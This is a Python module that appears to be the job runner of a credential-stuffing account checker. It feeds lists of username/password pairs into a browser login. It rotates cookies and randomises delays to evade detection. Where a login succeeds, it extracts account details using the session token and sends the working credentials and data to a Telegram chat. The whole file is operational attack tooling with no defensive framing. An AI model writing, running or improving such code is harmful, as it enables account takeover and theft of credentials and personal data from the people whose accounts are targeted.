"""Runs a job using the engine internals. Never raises."""
from __future__ import annotations
import asyncio
import json
import random
import time
import traceback

from . import info_extract
from .web_login import WebLogin
from .telegram import Telegram
from .jobs import Job


def _parse_result(raw: str) -> tuple[str, str]:
    status = "Unknown"
    try:
        j = json.loads(raw)
        if "message" in j:
            status = str(j["message"])
        if isinstance(j.get("data"), dict) and "name" in j["data"]:
            status = f"{status} | {j['data']['name']}"
    except Exception:
        status = "Parse Error"
    return ("VALID" if "Error_Success" in raw else "INVALID"), status


async def run_job(job: Job) -> None:
    job.status = "running"
    job.started_at = time.time()
    job.emit("status", status="running")

    tg = None
    if job.telegram_token and job.telegram_chat:
        try:
            tg = Telegram(job.telegram_token, job.telegram_chat)
        except Exception:
            tg = None

    web = WebLogin(accounts_per_recycle=20)
    try:
        await web.start()
    except Exception as e:
        job.status = "error"
        job.emit("status", status="error", msg=f"browser start failed: {e}")
        return

    try:
        for i, (user, pw) in enumerate(job.accounts):
            if job._stop_flag:
                job.status = "stopped"
                job.emit("status", status="stopped")
                return

            job.current_index = i + 1
            job.emit("progress", index=i + 1, total=job.total, user=user)

            # every 5 accounts, rotate cookies
            if i > 0 and i % 5 == 0:
                try:
                    await web._ctx.clear_cookies()
                    await web._ensure_on_login()
                except Exception:
                    pass

            raw = None
            try:
                raw = await asyncio.wait_for(web.try_login(user, pw), timeout=45.0)
            except asyncio.TimeoutError:
                job.errors += 1
                job.emit("result", user=user, label="TIMEOUT")
                await asyncio.sleep(2.0 + random.random() * 3.0)
                continue
            except Exception as e:
                job.errors += 1
                job.emit("result", user=user, label="ERROR", msg=str(e)[:200])
                await asyncio.sleep(2.0 + random.random() * 3.0)
                continue

            if not raw:
                job.errors += 1
                job.emit("result", user=user, label="TIMEOUT")
            else:
                label, status = _parse_result(raw)
                if label == "VALID":
                    job.valid += 1
                    job.emit("result", user=user, label="VALID", status=status)
                    record = {"user": user, "pw": pw, "info": None, "line": ""}

                    try:
                        guid = session = None
                        j = json.loads(raw)
                        guid = j.get("guid") or (j.get("data") or {}).get("guid")
                        session = j.get("session") or (j.get("data") or {}).get("session")
                        if guid and session:
                            try:
                                info = await asyncio.wait_for(
                                    asyncio.to_thread(
                                        info_extract.fetch, int(guid), session, job.devices_file
                                    ),
                                    timeout=40.0,
                                )
                            except asyncio.TimeoutError:
                                info = None
                            if info:
                                line = info_extract.format_pipe(info)
                                record["info"] = info
                                record["line"] = line
                                job.emit("info", user=user, line=line)
                                if tg:
                                    try:
                                        await asyncio.to_thread(
                                            tg.push_valid, user, pw, line
                                        )
                                    except Exception:
                                        pass
                    except Exception as e:
                        job.emit("info_error", user=user, msg=str(e)[:200])

                    job.results.append(record)
                else:
                    job.invalid += 1
                    job.emit("result", user=user, label="INVALID", status=status)

            await asyncio.sleep(3.0 + random.random() * 8.0)
    except Exception as e:
        job.status = "error"
        job.emit("status", status="error", msg=f"run failed: {e}",
                 trace=traceback.format_exc()[-1000:])
    finally:
        try:
            await asyncio.wait_for(web.stop(), timeout=15.0)
        except Exception:
            pass

    if job.status not in ("error", "stopped"):
        job.status = "done"
    job.finished_at = time.time()
    job.emit("status", status=job.status,
             valid=job.valid, invalid=job.invalid, errors=job.errors)